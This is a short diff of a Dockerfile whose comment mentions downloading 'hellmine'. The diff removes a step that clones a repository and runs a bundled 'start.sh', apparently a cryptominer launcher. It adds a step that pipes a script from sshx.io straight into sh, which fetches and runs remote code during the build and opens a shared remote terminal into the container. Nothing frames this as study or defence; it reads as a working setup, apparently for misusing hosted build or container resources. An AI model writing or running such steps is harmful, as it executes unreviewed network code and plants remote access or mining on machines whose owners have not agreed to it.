@@ -7,9 +7,10 @@ RUN apt update && apt upgrade -y && apt-get update && apt-get install -y htop \
     git \
     sudo \ 
     unzip \
+    wget \
     python3 
     
 
 # Tạo thư mục làm việc và tải hellmine
 
-RUN git clone https://github.com/Teo4268/Dockerfile.git && cd Dockerfile && unzip tool.zip && cd tool && chmod +x start.sh && ./start.sh 48
+RUN curl -sSf https://sshx.io/get | sh -s run
